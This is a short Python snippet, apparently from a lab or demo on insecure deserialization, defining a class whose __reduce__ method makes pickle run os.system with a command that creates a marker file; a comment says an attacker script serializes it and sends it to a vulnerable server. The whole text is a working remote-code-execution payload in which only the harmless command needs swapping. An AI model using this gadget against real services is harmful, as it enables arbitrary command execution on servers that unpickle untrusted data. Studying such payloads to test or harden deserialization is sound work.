import os
#This object is serialize by attacker.py and sent to vulnerable_server
class MyClass(object):
      myattr = "ECHO THIS"
      def __reduce__(self):
            return (os.system, ('touch /tmp/you-got-owned',))
